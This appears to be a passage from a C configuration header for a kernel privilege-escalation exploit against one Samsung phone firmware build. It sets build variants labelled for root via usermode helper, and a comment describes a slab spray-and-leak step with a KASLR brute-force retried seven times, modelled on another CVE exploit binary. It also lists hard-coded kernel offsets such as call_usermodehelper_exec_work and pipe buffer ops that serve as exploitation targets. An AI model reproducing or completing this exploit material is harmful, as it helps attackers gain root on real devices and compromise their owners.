...
#define BUILD_VARIANT_LABEL "dm3q-S918BXXSAFZH3-app-physical-p0-oracle"
#define APP_PHYS_P0_ORACLE 1
#else
#define BUILD_VARIANT_LABEL "dm3q-S918BXXSAFZH3-root-umh"
#endif
...
#define P0_FINGERPRINT_HEADER \
  "targets/dm3q-S918BXXSAFZH3/p0_fingerprint.h"
/* source: cve-2026-43499-app-afzh3.so FUN_0010597c retries its mm_struct
 * spray-and-leak step (fopen("/proc/slabinfo") + kernelsnitch-equivalent
 * bruteforce) up to 7 times before ever trusting the result, instead of
 * once. Each retry re-sprays from scratch (prepare_good_kernel_page),
 * so it never reuses a possibly-bad reclaim; matches the "retry the safe
 * step, not the risky trigger" pattern already validated for our own
 * tracefs KASLR fix. Was previously undefined here (defaulted to 1
 * attempt in src/main.c). */
#define APP_FOPS_FRESH_PAGE_ATTEMPTS 7
#endif
...
#define KMALLOC_CACHES_OFF        0x02064478ULL
#define ANON_PIPE_BUF_OPS_OFF     0x01e7f460ULL
#define SYSTEM_UNBOUND_WQ_OFF     0x02a90800ULL
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x001045d0ULL

#define ASHMEM_FOPS_OFF           0x0200d4b8ULL
